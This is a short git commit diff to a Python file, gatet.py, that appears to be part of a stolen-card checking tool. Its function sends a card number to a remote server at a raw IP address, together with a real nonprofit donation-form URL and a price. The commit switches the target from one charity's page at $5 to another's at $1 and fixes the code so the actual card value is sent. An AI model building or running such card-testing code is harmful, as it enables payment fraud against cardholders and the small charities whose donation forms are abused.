fc3da75b4e1059b1db17d03fbac5ad4ce289c8ae
a06505302-cpu <a06505302@gmail.com>
2026-03-08 01:07:02 +0200

    gatet.py

--- gatet.py
+++ gatet.py
@@ -1,7 +1,7 @@
 import requests
 def chkk(ccx):
 	cc=ccx.strip()
-	urll="https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=5"
-	price="5"
-	res=requests.get(f'http://151.247.197.54:5000/paypal?cc=[cc]&url={urll}&price={price}').text
+	urll="https://www.northidahowaterpolo.org/donations/donation-form/"
+	price="1"
+	res=requests.get(f'http://151.247.197.54:5500/paypal?cc={cc}&url={urll}&price={price}').text
 	return res
